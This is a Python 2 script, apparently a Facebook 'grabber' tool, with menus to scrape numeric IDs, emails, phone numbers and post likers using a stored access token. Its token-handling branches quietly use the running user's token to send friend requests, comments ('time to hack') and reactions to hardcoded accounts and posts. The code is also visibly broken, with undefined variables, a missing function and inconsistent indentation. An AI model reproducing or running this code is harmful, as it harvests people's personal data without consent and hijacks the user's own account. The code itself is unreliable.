#!/usr/bin/python
# coding=utf-8
# Originally Written By:Jam Shahrukh
# Source : Python2"
# Donot Recode It. 

#Import module
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 sania.py')

#Browser Setting
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exit():
	print "[!] Exit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jam(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def sani(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)
##### LOGO #####
banner = """
        \033[1;95m     ██ ███████ ███    ███ 
             ██ ██   ██ ████  ████ 
             ██ ███████ ██ ████ ██ 
        \033[1;96m██   ██ ██   ██ ██  ██  ██ 
        ███████ ██   ██ ██      ██
\033[1;97m══════════════════════════════════════════════
 [✓] Owner   : Jam x Xtylo x Asad x janzada
 [✓] Github  : https://github.com/Stylish-Queen   
 [✓] Facebook: Jam Shahrukh Official
 [✓] Whatsapp: +923053176060
 [✓] don't pheel bro :)
══════════════════════════════════════════════"""
# titik #
def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r[✔] Logging In "+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
successful = []
checkpoint = []
oks = []
cps = []
gagal = []
idh = []
id = []
emfromfriend = []
nofromfriend = []

##### Grab #####
def grab():
	global toket
	os.system('clear')
	try:
		toket=open('.login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		una = ('100052292505058')
	        kom = ('Hai Bang Andre😆🖐️')
	        reac = ('ANGRY')
	        post = ('185535143199568')
	        post2 = ('185535143199568')
	        kom2 = ('Saatnya Ngehack Hahaha😂🤣')
	        reac2 = ('LOVE')
	        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	        requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	        requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	        requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	        requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
		time.sleep(1)
		os.system('python2 sania.py')
	os.system('clear')
	print banner
	print "[1] Extract Numeric IDs From Public ID."
	print "[2] Extract Email's From Public ID."
	print "[3] Extract Phone Number From Public ID."
	print "[4] Extract Likes From Post ID."
	print "[0] Back."
	print('          ')
	grab_menu()
	
#Grab_input
def grab_menu():
	grm = raw_input("\nChoose Option >> ")
	if grm =="":
		print " Wrong Input"
		grab_menu()
	elif grm =="1":
		idfromfriend()
	elif grm =="2":
		emailfromfriend()
	elif grm =="3":
		numberfromfriend()
	elif grm =="4":
		idfrompost()
	elif grm =="5":
		idfromgroup()
	elif grm =="0":
		time.sleep(1)
		os.system('python2 sania.py')
	else:
		print "[!] Wrong input"
		grab_menu()
		



##### Reactions POST ID EXTRACT#####
def idfrompost():
	global toket
	idh = []
	os.system('clear')
	try:
		toket=open('.login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf .login.txt')
		time.sleep(1)
		os.system('python2 sania.py')
	try:
		os.mkdir('/sdcard/ids')
	except OSError:
		pass
	try:
		os.system('clear')
		print banner
		post = ('185535143199568')
		una = ('100052292505058')
		una = raw_input("[+] Post ID : ")
		try:
			jok=requests.post("https://graph.facebook.com/"+post+"/reactions?type=" +una+ "&access_token="+ toket)
			op=json.loads(jok.text)
		except KeyError:
			print"[!] Friend Not Found"
			raw_input("Press Enter To Back ")
			grab()
		r=requests.get("https://graph.facebook.com/"+una+"/reactions?limit=9999999&access_token="+ toket)
		z=json.loads(r.text)
		jam('[✓] Getting Post Likes Extract IDs...')
		print"--------------------------------------"
		bz = open('/sdcard/ids/jam_post.txt','w')
		for a in z['data']:
			idh.append(a['id'])
			bz.write(a['id'] + ' | ' '\n')
			print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
		bz.close()
		print '\r[✓] The Process Has Been Completed.'
		print"\r[✓] Total IDs Founded : "+str(len(idh))
		done = raw_input("\r[?] Save File With Name : ")
		print("\r[✓] The File Has Been Saved As save/"+done)
		raw_input("\nPress Enter To Back ")
		grab()
	except IOError:
		print"[!] Error While Creating file"
		
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("[!]The Process Has Been Stopped")
		raw_input("\nPress Enter To Back ")
		grab()
	except KeyError:
		print('[!] Error')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print"[✖] No Connection"
		time.sleep(1)
		grab()


	
if __name__ == '__main__':
	grab()
